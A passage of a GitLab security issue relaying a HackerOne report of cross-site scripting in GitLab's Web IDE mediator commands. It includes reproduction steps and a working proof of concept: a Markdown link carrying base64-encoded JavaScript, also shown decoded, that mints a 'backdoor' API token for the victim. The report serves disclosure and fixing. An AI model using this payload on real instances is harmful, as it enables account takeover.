lang=\&quot;shell\&quot;\u003eDB Adapter: PostgreSQL  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC18\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eDB Version: 13.8  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC19\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eElasticsearch:  no  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC20\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eGeo:        no  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC21\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eUsing LDAP: no  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC22\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eUsing Omniauth: \u003cspan class=\&quot;nb\&quot;\u003eyes  \u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC23\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eOmniauth Providers:\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC24\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC25\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eGitLab Shell  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC26\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eVersion:    14.18.0  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC27\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eRepository storages:  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC28\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e- default:  unix:/var/opt/gitlab/gitaly/gitaly.socket  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC29\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eGitLab Shell path:      /opt/gitlab/embedded/service/gitlab-shell  \u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003ch4 data-sourcepos=\&quot;78:1-78:24\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-steps-to-reproduce\&quot; class=\&quot;anchor\&quot; href=\&quot;#steps-to-reproduce\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eSteps to Reproduce\u003c/h4\u003e\u0026#x000A;\u003col data-sourcepos=\&quot;80:1-93:0\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;80:1-81:0\&quot;\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;80:4-80:147\&quot;\u003eBring up an instance of GitLab EE (herein \u003ccode data-sourcepos=\&quot;80:47-80:60\&quot;\u003ehttps://gitlab\u003c/code\u003e) following the \u003ca data-sourcepos=\&quot;80:78-80:146\&quot; href=\&quot;https://about.gitlab.com/install/#ubuntu\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003einstallation instructions\u003c/a\u003e.\u003c/p\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;82:1-83:0\&quot;\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;82:4-82:475\&quot;\u003eEnable the \u003ccode data-sourcepos=\&quot;82:16-82:29\&quot;\u003evscode_web_ide\u003c/code\u003e \u003ca data-sourcepos=\&quot;82:32-82:107\&quot; href=\&quot;https://docs.gitlab.com/ee/administration/feature_flags.html\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003efeature flag\u003c/a\u003e by running \u003ccode data-sourcepos=\&quot;82:121-82:140\&quot;\u003egitlab-rails console\u003c/code\u003e followed by \u003ccode data-sourcepos=\&quot;82:156-82:186\&quot;\u003eFeature.enable(:vscode_web_ide)\u003c/code\u003e once inside the IRB shell. (\u003cstrong data-sourcepos=\&quot;82:217-82:231\&quot;\u003ePlease note\u003c/strong\u003e: per the \u003ca data-sourcepos=\&quot;82:242-82:321\&quot; href=\&quot;https://docs.gitlab.com/ee/user/project/web_ide_beta/index.html\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003edocumentation\u003c/a\u003e, the new Web IDE will be enabled by default in v15.11 which releases in 12 days&#39; time and so enabling this feature flag will soon no longer be required).\u003c/p\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;84:1-89:0\&quot;\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;84:4-84:273\&quot;\u003eCreate a new project from \u003ca data-sourcepos=\&quot;84:30-84:115\&quot; href=\&quot;https://gitlab/projects/new#blank_project\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003ehttps://gitlab/projects/new#blank_project\u003c/a\u003e and commit a README.md file containing the following proof of concept link, whose decoded JavaScript is included at the end of this section under \&quot;PoC Code\&quot;:\u003c/p\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;86:5-88:7\&quot; data-canonical-lang=\&quot;markdown\&quot; class=\&quot;code highlight js-syntax-highlight language-markdown\&quot; lang=\&quot;markdown\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;markdown\&quot;\u003e\u003cspan class=\&quot;p\&quot;\u003e[\u003c/span\u003e\u003cspan class=\&quot;nv\&quot;\u003eExecute command\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e](\u003c/span\u003e\u003cspan class=\&quot;sx\&quot;\u003ecommand:gitlab-web-ide.mediator.set-href?[\&quot;javascript:eval%28atob%28&#39;dmFyIHRvayxwPW5ldyBET01QYXJzZXIsbz13aW5kb3cubG9jYXRpb24ub3JpZ2luO2ZldGNoKG8rIi8tL3Byb2ZpbGUvcGVyc29uYWxfYWNjZXNzX3Rva2VucyIpLnRoZW4oKGZ1bmN0aW9uKGUpe3JldHVybiBlLm9rP2UudGV4dCgpOlByb21pc2UucmVqZWN0KGUpfSkpLnRoZW4oKGZ1bmN0aW9uKGUpe3JldHVybiB0b2s9cC5wYXJzZUZyb21TdHJpbmcoZSwidGV4dC9odG1sIikuZ2V0RWxlbWVudHNCeU5hbWUoImNzcmYtdG9rZW4iKVswXS5jb250ZW50LGZldGNoKG8rIi8tL3Byb2ZpbGUvcGVyc29uYWxfYWNjZXNzX3Rva2VucyIse2NyZWRlbnRpYWxzOiJpbmNsdWRlIixoZWFkZXJzOnsiQ29udGVudC1UeXBlIjoiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIixtZXRob2Q6IlBPU1QifSxib2R5OmBhdXRoZW50aWNpdHlfdG9rZW49JHtlbmNvZGVVUklDb21wb25lbnQodG9rKX0mcGVyc29uYWxfYWNjZXNzX3Rva2VuW25hbWVdPWJhY2tkb29yJnBlcnNvbmFsX2FjY2Vzc190b2tlbltleHBpcmVzX2F0XT0mcGVyc29uYWxfYWNjZXNzX3Rva2VuW3Njb3Blc11bXT1hcGlgLG1ldGhvZDoiUE9TVCIsbW9kZToiY29ycyJ9KX0pKS50aGVuKChmdW5jdGlvbihlKXtyZXR1cm4gZS5vaz9lLmpzb24oKTpQcm9taXNlLnJlamVjdChlKX0pKS50aGVuKChmdW5jdGlvbihlKXthbGVydChgQ3JlYXRlZCBwZXJzb25hbCBhY2Nlc3MgdG9rZW46ICR7ZS5uZXdfdG9rZW59YCl9KSk7&#39;%29%29\&quot;]\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e)\u003c/span\u003e  \u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;90:1-91:0\&quot;\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;90:4-90:149\&quot;\u003eOpen the README.md file in the Web IDE (\u003ca href=\&quot;https://gitlab/-/ide/project/demo/edit/main/-/README.md\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003ehttps://gitlab/-/ide/project/demo/edit/main/-/README.md\u003c/a\u003e) and Ctrl/Cmd-click on the \&quot;Execute command\&quot; link.\u003c/p\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;92:1-93:0\&quot;\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;92:4-92:110\&quot;\u003eObserve the JavaScript alert dialog containing a newly minted personal access token for the logged-in user.\u003c/p\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003c/ol\u003e\u0026#x000A;\u003ch5 data-sourcepos=\&quot;94:1-94:15\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-poc-code\&quot; class=\&quot;anchor\&quot; href=\&quot;#poc-code\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003ePoC Code\u003c/h5\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;96:1-98:3\&quot; data-canonical-lang=\&quot;javascript\&quot; class=\&quot;code highlight js-syntax-highlight language-javascript\&quot; lang=\&quot;javascript\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;javascript\&quot;\u003e\u003cspan class=\&quot;kd\&quot;\u003evar\u003c/span\u003e \u003cspan class=\&quot;nx\&quot;\u003etok\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003cspan class=\&quot;nx\&quot;\u003ep\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e\u003cspan class=\&quot;k\&quot;\u003enew\u003c/span\u003e \u003cspan class=\&quot;nx\&quot;\u003eDOMParser\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003cspan class=\&quot;nx\&quot;\u003eo\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e\u003cspan class=\&quot;nb\&quot;\u003ewindow\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nx\&quot;\u003elocation\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nx\&quot;\u003eorigin\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e;\u003c/span\u003e\u003cspan class=\&quot;nf\&quot;\u003efetch\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;nx\&quot;\u003eo\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e+\u003c/span\u003e\u003cspan class=\&quot;dl\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;s2\&quot;\u003e/-/profile/personal_access_tokens\u003c/span\u003e\u003cspan class=\&quot;dl\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e).\u003c/span\u003e\u003cspan class=\&quot;nf\&quot;\u003ethen\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e((\u003c/span\u003e\u003cspan class=\&quot;kd\&quot;\u003efunction\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;nx\&quot;\u003ee\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e){\u003c/span\u003e\u003cspan class=\&quot;k\&quot;\u003ereturn\u003c/span\u003e \u003cspan class=\&quot;nx\&quot;\u003ee\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nx\&quot;\u003eok\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e?\u003c/span\u003e\u003cspan class=\&quot;nx\&quot;\u003ee\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nf\&quot;\u003etext\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e():\u003c/span\u003e\u003cspan class=\&quot;nb\&quot;\u003ePromise\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nf\&quot;\u003ereject\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;nx\&quot;\u003ee\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e)})).\u003c/span\u003e\u003cspan class=\&quot;nf\&quot;\u003ethen\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e((\u003c/span\u003e\u003cspan class=\&quot;kd\&quot;\u003efunction\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;nx\&quot;\u003ee\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e){\u003c/span\u003e\u003cspan class=\&quot;k\&quot;\u003ereturn\u003c/span\u003e \u003cspan class=\&quot;nx\&quot;\u003etok\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e\u003cspan class=\&quot;nx\&quot;\u003ep\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nf\&quot;\u003eparseFromString\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;nx\&quot;\u003ee\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003cspan class=\&quot;dl\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;s2\&quot;\u003etext/html\u003c/span\u003e\u003cspan class=\&quot;dl\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e).\u003c/span\u003e\u003cspan class=\&quot;nf\&quot;\u003egetElementsByName\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;dl\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;s2\&quot;\u003ecsrf-token\u003c/span\u003e\u003cspan class=\&quot;dl\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e)[\u003c/span\u003e\u003cspan class=\&quot;mi\&quot;\u003e0\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e].\u003c/span\u003e\u003cspan class=\&quot;nx\&quot;\u003econtent\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003cspan class=\&quot;nf\&quot;\u003efetch\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;nx\&quot;\u003eo\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e+\u003c/span\u003e\u003cspan class=\&quot;dl\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;s2\&quot;\u003e/-/profile/personal_access_tokens\u003c/span\u003e\u003cspan class=\&quot;dl\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,{\u003c/span\u003e\u003cspan class=\&quot;na\&quot;\u003ecredentials\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e:\u003c/span\u003e\u003cspan class=\&quot;dl\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;s2\&quot;\u003einclude\u003c/span\u003e\u003cspan class=\&quot;dl\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003cspan class=\&quot;na\&quot;\u003eheaders\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e:{\u003c/span\u003e\u003cspan class=\&quot;dl\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;s2\&quot;\u003eContent-Type\u003c/span\u003e\u003cspan class=\&quot;dl\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e:\u003c/span\u003e\u003cspan class=\&quot;dl\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;s2\&quot;\u003eapplication/x-www-form-urlencoded\u003c/span\u003e\u003cspan class=\&quot;dl\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003cspan class=\&quot;na\&quot;\u003emethod\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e:\u003c/span\u003e\u003cspan class=\&quot;dl\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;s2\&quot;\u003ePOST\u003c/span\u003e\u003cspan class=\&quot;dl\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e},\u003c/span\u003e\u003cspan class=\&quot;na\&quot;\u003ebody\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e:\u003c/span\u003e\u003cspan class=\&quot;s2\&quot;\u003e`authenticity_token=\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e${\u003c/span\u003e\u003cspan class=\&quot;nf\&quot;\u003eencodeURIComponent\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;nx\&quot;\u003etok\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e)}\u003c/span\u003e\u003cspan class=\&quot;s2\&quot;\u003e\u0026amp;personal_access_token[name]=backdoor\u0026amp;personal_access_token[expires_at]=\u0026amp;personal_access_token[scopes][]=api`\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003cspan class=\&quot;na\&quot;\u003emethod\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e:\u003c/span\u003e\u003cspan class=\&quot;dl\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;s2\&quot;\u003ePOST\u003c/span\u003e\u003cspan class=\&quot;dl\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003cspan class=\&quot;na\&quot;\u003emode\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e:\u003c/span\u003e\u003cspan class=\&quot;dl\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;s2\&quot;\u003ecors\u003c/span\u003e\u003cspan class=\&quot;dl\&quot;\u003e\&quot;\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e})})).\u003c/span\u003e\u003cspan class=\&quot;nf\&quot;\u003ethen\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e((\u003c/span\u003e\u003cspan class=\&quot;kd\&quot;\u003efunction\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;nx\&quot;\u003ee\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e){\u003c/span\u003e\u003cspan class=\&quot;k\&quot;\u003ereturn\u003c/span\u003e \u003cspan class=\&quot;nx\&quot;\u003ee\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nx\&quot;\u003eok\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e?\u003c/span\u003e\u003cspan class=\&quot;nx\&quot;\u003ee\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nf\&quot;\u003ejson\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e():\u003c/span\u003e\u003cspan class=\&quot;nb\&quot;\u003ePromise\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nf\&quot;\u003ereject\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;nx\&quot;\u003ee\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e)})).\u003c/span\u003e\u003cspan class=\&quot;nf\&quot;\u003ethen\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e((\u003c/span\u003e\u003cspan class=\&quot;kd\&quot;\u003efunction\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;nx\&quot;\u003ee\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e){\u003c/span\u003e\u003cspan class=\&quot;nf\&quot;\u003ealert\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;s2\&quot;\u003e`Created personal access token: \u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e${\u003c/span\u003e\u003cspan class=\&quot;nx\&quot;\u003ee\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nx\&quot;\u003enew_token\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e}\u003c/span\u003e\u003cspan class=\&quot;s2\&quot;\u003e`\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e)}));\u003c/span\u003e  \u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003ch4 data-sourcepos=\&quot;100:1-100:12\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-impact\&quot; class=\&quot;anchor\&quot; href=\&quot;#impact\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eImpact\u003c/h4\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;102:1-102:228\&quot; dir=\&quot;auto\&quot;\u003eAn attacker who convinces a victim to interact with a Markdown link in the new Web IDE can execute JavaScript in that victim&#39;s GitLab session allowing them to perform unwanted actions on their behalf and take over their account.\u003c/p\u003e\u0026#x000A;\u003ch2 data-sourcepos=\&quot;104:1-104:14\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-attachments\&quot; class=\&quot;anchor\&quot; href=\&quot;#attachments\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eAttachments\u003c/h2\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;106:1-106:77\&quot; dir=\&quot;auto\&quot;\u003e\u003cstrong data-sourcepos=\&quot;106:1-106:12\&quot;\u003eWarning:\u003c/strong\u003e Attachments received through HackerOne, please exercise caution!\u003c/p\u003e\u0026#x000A;\u003cul data-sourcepos=\&quot;108:1-110:0\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;108:1-108:113\&quot;\u003e\u003ca data-sourcepos=\&quot;108:3-108:113\&quot; href=\&quot;https://h1.sec.gitlab.net/a/dbb6230e-4d9b-4530-8e7a-6c95c07ccf4a/GitLab_WebIDE_XSS.png\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003eGitLab_WebIDE_XSS.png\u003c/a\u003e\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;109:1-110:0\&quot;\u003e\u003ca data-sourcepos=\&quot;109:3-109:123\&quot; href=\&quot;https://h1.sec.gitlab.net/a/b090b6f5-ca4e-4101-8009-cf9f0b9cf15c/GitLab_WebIDE_Mediator.png\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003eGitLab_WebIDE_Mediator.png\u003c/a\u003e\u003c/li\u003e\u0026#x000A;\u003c/ul\u003e\u0026#x000A;\u003ch2 data-sourcepos=\&quot;111:1-111:19\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-how-to-reproduce\&quot; class=\&quot;anchor\&quot; href=\&quot;#how-to-reproduce\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eHow To Reproduce\u003c/h2\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;113:1-113:57\&quot; dir=\&quot;auto\&quot;\u003ePlease add \u003ca data-sourcepos=\&quot;113:12-113:40\&quot; href=\&quot;https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003ereproducibility information\u003c/a\u003e to this section:\u003c/p\u003e\u0026#x000A;\u003col data-sourcepos=\&quot;115:1-118:0\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;115:1-115:2\&quot;\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;116:1-116:2\&quot;\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;117:1-117:2\&quot;\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003c/ol\u003e&quot;,&quot;initialDescriptionText&quot;:&quot;:warning: **Please read [the process](https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md) on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.**\n\n**[HackerOne report #1940598](https://hackerone.com/reports/1940598)** by `viridian_40826d` on 2023-04-10, assigned to @greg:\n\n[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)\n\n## Report\n\n####  Summary\n\nSince [v15.7](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/95169), GitLab ships with a new [Web IDE](https://docs.gitlab.com/ee/user/project/web_ide_beta/index.html) powered by the [Monaco](https://github.com/microsoft/monaco-editor) editor.\n\nThe Web IDE is [architected](https://gitlab.com/gitlab-org/gitlab-web-ide/-/blob/77e6cd26c9f6b2694290b9800f9cc0c2b328e1bd/docs/dev/architecture_packages.md) such that certain interactions take place outside of the sandboxed Monaco runtime environment. These interactions are handled by the `vscode-mediator-commands` package:\n\n\u003e The vscode-mediator-commands package creates a set of commands that can be **triggered** from the VSCode Extension runtime environment but are **executed** in the Iframe runtime environment. This means that web requests naturally use the Main cookie and the command can have full access to the provided configuration.\n\nOne such mediator command is `SET_HREF`, which [constructs](https://gitlab.com/gitlab-org/gitlab-web-ide/-/blob/42428717ac4793969ad83c8feaa67440b36b1a96/packages/vscode-mediator-commands/src/commands/index.ts#L115-120) a URL object by concatenating the value of `window.parent.location.href` with the `href` string attribute:\n\n```javascript  \nconst parentHref = window.parent.location.href;  \nconst newUrl = new URL(href, parentHref);  \nwindow.parent.location.href = newUrl.href;  \n```\n\nBy default, the UI calls the `SET_HREF` command referencing an enum of trusted links to the preferences and feedback pages so that these can be opened in a new tab, outside of the sandbox:\n\n![GitLab_WebIDE_Mediator.png](https://h1.sec.gitlab.net/a/b090b6f5-ca4e-4101-8009-cf9f0b9cf15c/GitLab_WebIDE_Mediator.png)\n\nHowever,  the `href` attribute can become user-controlled when a mediator command URL is formed in Markdown. We can then clobber the `parentHref` by introducing our own URL in `href` with an explicitly defined scheme, like so:\n\n```markdown  \n\u003c!-- Opens the result of: new URL(\&quot;javascript:confirm(document.domain)\&quot;, \&quot;https://gitlab\&quot;) --\u003e  \n[Execute command](command:gitlab-web-ide.mediator.set-href?[\&quot;javascript:confirm%28document.domain%29\&quot;])  \n```\n\nWhile the subframe used to _preview_ Markdown is itself sandboxed, the editor frame and its interactions with the mediator are not. Since the Web IDE supports Monaco&#39;s \&quot;follow link\&quot; behaviour, an attacker can execute arbitrary JavaScript in a victim&#39;s GitLab session when they Ctrl/Cmd-click a crafted link in a Markdown file:\n\n![GitLab_WebIDE_XSS.png](https://h1.sec.gitlab.net/a/dbb6230e-4d9b-4530-8e7a-6c95c07ccf4a/GitLab_WebIDE_XSS.png)\n\n####  Environment\n\nSelf-managed GitLab CE and EE instances where a strict CSP is not enforced are affected by this vulnerability.\n\n`gitlab-rake gitlab:env:info` output:\n\n```bash  \nSystem information  \nSystem:     Ubuntu 20.04  \nProxy:      no  \nCurrent User:   git  \nUsing RVM:  no  \nRuby Version:   3.0.5p211  \nGem Version:    3.2.33  \nBundler Version:2.3.15  \nRake Version:   13.0.6  \nRedis Version:  6.2.11  \nSidekiq Version:6.5.7\n\nGitLab information  \nVersion:    15.10.2-ee  \nRevision:   a54d6973eae  \nDirectory:  /opt/gitlab/embedded/service/gitlab-rails  \nDB Adapter: PostgreSQL  \nDB Version: 13.8  \nElasticsearch:  no  \nGeo:        no  \nUsing LDAP: no  \nUsing Omniauth: yes  \nOmniauth Providers:\n\nGitLab Shell  \nVersion:    14.18.0  \nRepository storages:  \n- default:  unix:/var/opt/gitlab/gitaly/gitaly.socket  \nGitLab Shell path:      /opt/gitlab/embedded/service/gitlab-shell  \n```\n\n####  Steps to Reproduce\n\n1. Bring up an instance of GitLab EE (herein `https://gitlab`) following the [installation instructions](https://about.gitlab.com/install/#ubuntu).\n\n2. Enable the `vscode_web_ide` [feature flag](https://docs.gitlab.com/ee/administration/feature_flags.html) by running `gitlab-rails console` followed by `Feature.enable(:vscode_web_ide)` once inside the IRB shell. (**Please note**: per the [documentation](https://docs.gitlab.com/ee/user/project/web_ide_beta/index.html), the new Web IDE will be enabled by default in v15.11 which releases in 